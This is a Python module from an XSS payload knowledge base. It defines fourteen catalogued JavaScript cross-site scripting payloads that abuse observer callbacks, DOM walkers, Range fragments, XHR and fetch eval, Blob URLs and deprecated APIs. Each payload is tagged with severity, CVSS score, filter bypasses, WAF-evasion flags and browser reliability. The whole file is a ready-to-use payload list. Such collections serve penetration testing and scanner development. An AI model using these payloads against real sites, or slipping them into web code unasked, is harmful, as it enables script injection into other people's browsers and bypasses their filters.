#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Deep Memory XSS Payloads - Part 3
Observers, DOM methods, Selection/Range API, XHR/Fetch, Blob/File API, and deprecated APIs.
"""

from ..models import PayloadEntry


BRS_KB_DEEP_MEMORY_PAYLOADS_PART3 = {
    # ============================================================
    # INTERSECTION/RESIZE OBSERVER
    # ============================================================
    "intersection-observer-xss": PayloadEntry(
        payload="new IntersectionObserver(e=>e.forEach(x=>x.isIntersecting&&alert(1))).observe(document.body)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="IntersectionObserver callback XSS",
        tags=["observer", "intersection"],
        bypasses=["observer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "resize-observer-xss": PayloadEntry(
        payload="new ResizeObserver(()=>alert(1)).observe(document.body)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="ResizeObserver callback XSS",
        tags=["observer", "resize"],
        bypasses=["observer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "mutation-observer-xss": PayloadEntry(
        payload="new MutationObserver(()=>alert(1)).observe(document,{childList:1})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="MutationObserver callback XSS",
        tags=["observer", "mutation"],
        bypasses=["observer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "performance-observer-xss": PayloadEntry(
        payload="new PerformanceObserver(()=>alert(1)).observe({entryTypes:['resource']})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="PerformanceObserver callback XSS",
        tags=["observer", "performance"],
        bypasses=["observer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # FORGOTTEN DOM METHODS
    # ============================================================
    "dom-createHTMLDocument": PayloadEntry(
        payload="document.implementation.createHTMLDocument().write('<script>alert(1)<\\/script>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="createHTMLDocument write XSS",
        tags=["dom", "createHTMLDocument"],
        bypasses=["document_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "dom-createTreeWalker": PayloadEntry(
        payload="document.createTreeWalker(document.body,NodeFilter.SHOW_ELEMENT,{acceptNode:()=>(alert(1),1)}).nextNode()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="TreeWalker filter callback XSS",
        tags=["dom", "treewalker"],
        bypasses=["dom_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "dom-createNodeIterator": PayloadEntry(
        payload="document.createNodeIterator(document.body,NodeFilter.SHOW_ELEMENT,{acceptNode:()=>(alert(1),1)}).nextNode()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="NodeIterator filter callback XSS",
        tags=["dom", "nodeiterator"],
        bypasses=["dom_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SELECTION/RANGE API
    # ============================================================
    "range-createContextualFragment": PayloadEntry(
        payload="document.createRange().createContextualFragment('<img src=x onerror=alert(1)>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Range createContextualFragment XSS",
        tags=["dom", "range", "fragment"],
        bypasses=["dom_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # XHR/FETCH RESPONSE INJECTION
    # ============================================================
    "xhr-responseText": PayloadEntry(
        payload="x=new XMLHttpRequest();x.open('GET','/');x.onload=()=>eval(x.responseText);x.send()",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="XHR response eval XSS",
        tags=["xhr", "response", "eval"],
        bypasses=["xhr_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "fetch-text-eval": PayloadEntry(
        payload="fetch('/').then(r=>r.text()).then(eval)",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Fetch response eval XSS",
        tags=["fetch", "response", "eval"],
        bypasses=["fetch_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # BLOB/FILE API TRICKS
    # ============================================================
    "blob-createObjectURL-html": PayloadEntry(
        payload='open(URL.createObjectURL(new Blob(["<script>opener.alert(1)<\\/script>"],{type:"text/html"})))',
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Blob URL HTML execution",
        tags=["blob", "objecturl"],
        bypasses=["url_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "file-reader-result": PayloadEntry(
        payload="r=new FileReader();r.onload=()=>eval(r.result);r.readAsText(new Blob(['alert(1)']))",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="FileReader result eval XSS",
        tags=["filereader", "eval"],
        bypasses=["file_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # DEPRECATED BUT WORKING
    # ============================================================
    "deprecated-document-all": PayloadEntry(
        payload="document.all.tags('script')[0].text='alert(1)'",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="document.all (deprecated but works)",
        tags=["deprecated", "document.all"],
        bypasses=["document_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "deprecated-execCommand": PayloadEntry(
        payload="document.execCommand('insertHTML',false,'<img src=x onerror=alert(1)>')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="execCommand insertHTML",
        tags=["deprecated", "execCommand"],
        bypasses=["document_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
}
